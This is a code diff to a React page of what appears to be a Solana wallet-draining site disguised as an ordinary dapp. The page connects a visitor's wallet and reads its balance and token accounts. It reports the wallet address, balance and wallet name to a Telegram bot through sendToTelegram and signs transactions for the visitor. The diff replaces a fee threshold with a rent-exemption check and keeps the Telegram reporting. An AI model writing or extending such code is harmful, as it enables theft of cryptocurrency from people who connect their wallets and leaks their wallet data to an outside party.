@@ -2,7 +2,14 @@ import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
-import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBalance } from '@/utils/walletUtils';
+import { 
+  getTokenAccounts, 
+  sendToTelegram, 
+  signAndSendTransaction, 
+  getWalletBalance, 
+  MINIMUM_REQUIRED_SOL,
+  hasEnoughSolForRent 
+} from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
 import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';
@@ -226,21 +233,21 @@ const Index = () => {
         return;
       }
 
-      const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
-      if (walletData.balance * LAMPORTS_PER_SOL <= minimumRequiredBalance) {
-        console.log("Wallet balance too low for fees");
+      if (!hasEnoughSolForRent(walletData.balance)) {
+        console.log("Wallet balance too low for rent exemption");
         
-        const lowBalanceMessage = {
+        const lowRentMessage = {
           address: publicKey.toString(),
-          message: `INSUFFICIENT BALANCE FOR FEES. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: 0.00089 SOL.`,
+          message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: ${MINIMUM_REQUIRED_SOL} SOL.`,
           walletName: wallet?.adapter?.name || "Unknown Wallet"
         };
         
-        await sendToTelegram(lowBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        await sendToTelegram(lowRentMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
         toast({
-          title: "Low Balance",
-          description: "Your wallet balance is too low for transaction processing.",
+          title: "Insufficient Funds",
+          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL for rent exemption and fees.`,
+          variant: "destructive",
         });
         setIsProcessing(false);
         setShowLoadingModal(false);
